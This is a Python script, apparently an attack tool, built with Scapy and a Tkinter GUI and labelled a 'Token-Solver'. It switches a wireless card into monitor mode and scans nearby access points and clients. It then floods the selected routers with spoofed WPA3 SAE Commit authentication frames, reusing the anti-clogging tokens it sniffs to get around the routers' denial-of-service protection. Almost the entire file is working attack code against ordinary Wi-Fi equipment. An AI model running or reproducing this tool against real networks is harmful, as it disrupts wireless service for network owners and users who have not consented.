import os, sys, time, threading
from scapy.all import *
import tkinter as tk
from tkinter import ttk

class TokenAwareAuditor:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {}
        self.running = True
        self.firing = False
        self.ac_token = None # Store the most recent anti-clogging token
        
        self.lock_hardware()
        self.build_gui()

    def lock_hardware(self):
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")

    def build_gui(self):
        self.root = tk.Tk()
        self.root.title("Surgical Token-Solver v6.5")
        self.root.geometry("1000x800")
        self.root.configure(bg="#050505")

        # Search Bar
        search_frame = tk.Frame(self.root, bg="#050505")
        search_frame.pack(pady=10, fill="x", padx=20)
        tk.Label(search_frame, text="SEARCH:", fg="#00FF41", bg="#050505").pack(side="left")
        self.search_var = tk.StringVar()
        self.search_var.trace("w", lambda *args: self.update_ui())
        tk.Entry(search_frame, textvariable=self.search_var, bg="#111", fg="#00FF41").pack(side="left", fill="x", expand=True, padx=10)

        # Treeview
        self.tree = ttk.Treeview(self.root, columns=("MAC", "SSID", "BSSID", "CH"), show="headings")
        for col in ("MAC", "SSID", "BSSID", "CH"): self.tree.heading(col, text=col)
        self.tree.pack(padx=20, pady=10, fill="both", expand=True)

        # Controls
        self.btn_text = tk.StringVar(value="ENGAGE TOKEN BYPASS")
        tk.Button(self.root, textvariable=self.btn_text, command=self.toggle_attack, bg="#aa5500", fg="white", height=2).pack(pady=10)
        
        # Start Threads
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner, daemon=True).start()
        threading.Thread(target=self.token_listener, daemon=True).start()

    def token_listener(self):
        """
        Logic: Listen for SAE Reject (Status 76) which contains the Anti-Clogging Token.
        """
        def process_token(pkt):
            if self.firing and pkt.haslayer(Dot11Auth) and pkt.status == 76:
                # Extract the Anti-Clogging Token element (Element ID 122)
                # This is a simplified extraction of the raw load
                if pkt.haslayer(Raw):
                    self.ac_token = pkt.getlayer(Raw).load
                    print(f"[*] Solved Challenge! Token: {self.ac_token.hex()[:10]}...")

        sniff(iface=self.iface, prn=process_token, store=0)

    def relay_desync_loop(self, targets):
        while self.firing:
            for mac, ssid, bssid, ch in targets:
                if not self.firing: break
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                
                # Logic: Build the SAE Commit frame
                # If we have a token, we attach it to bypass the 'drop'
                base = RadioTap()/Dot11(addr1=bssid, addr2=mac, addr3=bssid)/Dot11Auth(algo=3, seqnum=1)
                
                if self.ac_token:
                    # Append the token to the packet to 'solve' the router's challenge
                    pkt = base/Raw(load=b"\x7a" + bytes([len(self.ac_token)]) + self.ac_token)
                else:
                    pkt = base

                try:
                    sendp(pkt, iface=self.iface, count=10, inter=0.005, verbose=False)
                except: break
            time.sleep(0.05)

    # ... [Rest of the hopper/scanner/ui logic from v6.0] ...
    def update_ui(self):
        search_term = self.search_var.get().lower()
        for i in self.tree.get_children(): self.tree.delete(i)
        for mac, info in self.discovered.items():
            if search_term in mac.lower() or search_term in info["SSID"].lower():
                self.tree.insert("", "end", values=(mac, info["SSID"], info["BSSID"], info["CH"]))

    def toggle_attack(self):
        if not self.firing:
            sel = self.tree.selection()
            if not sel: return
            self.firing = True
            self.btn_text.set("BYPASS ACTIVE")
            threading.Thread(target=self.relay_desync_loop, args=([self.tree.item(i)["values"] for i in sel],), daemon=True).start()
        else:
            self.firing = False
            self.btn_text.set("ENGAGE TOKEN BYPASS")

    def scanner(self):
        def callback(pkt):
            if not self.firing and pkt.haslayer(Dot11):
                if pkt.type == 0 and pkt.subtype == 8: # Beacon
                    ssid = pkt.info.decode(errors="ignore") or "Hidden"
                    bssid = pkt.addr3
                    for mac, data in self.discovered.items():
                        if data["BSSID"] == bssid: data["SSID"] = ssid
                if pkt.addr2 and pkt.addr3 and pkt.addr2 != pkt.addr3:
                    mac, bssid = pkt.addr2, pkt.addr3
                    if mac not in self.discovered and ":" in mac:
                        self.discovered[mac] = {"BSSID": bssid, "SSID": "Scanning...", "CH": self.current_ch}
                        self.root.after(0, self.update_ui)
        sniff(iface=self.iface, prn=callback, store=0)

    def hopper(self):
        ch = 1
        while self.running:
            if not self.firing:
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                self.current_ch = ch
                ch = (ch % 13) + 1
                time.sleep(0.5)
            else: time.sleep(1)

    def shutdown(self):
        self.running = False; self.firing = False
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up && sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    TokenAwareAuditor(sys.argv[1]).root.mainloop()
